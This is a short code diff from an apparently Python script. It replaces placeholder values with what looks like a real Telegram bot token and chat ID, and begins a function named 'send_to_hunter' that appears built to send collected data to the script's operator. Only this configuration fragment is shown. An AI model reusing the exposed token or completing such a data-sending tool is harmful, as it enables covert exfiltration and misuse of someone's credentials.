@@ -4,8 +4,8 @@ import time
 import platform
 
 # --- ضع بياناتك هنا يا Hunter ---
-TOKEN = "هنا_ضع_توكن_البوت_الخاص_بك"
-CHAT_ID = "هنا_ضع_ايدي_حسابك_في_تلجرام"
+TOKEN = "8501788737:AAGT30o-tywPq3G7tr1bDPyq_8pnQahOL7o"
+CHAT_ID = "8133357563"
 
 def send_to_hunter(data):
     try:
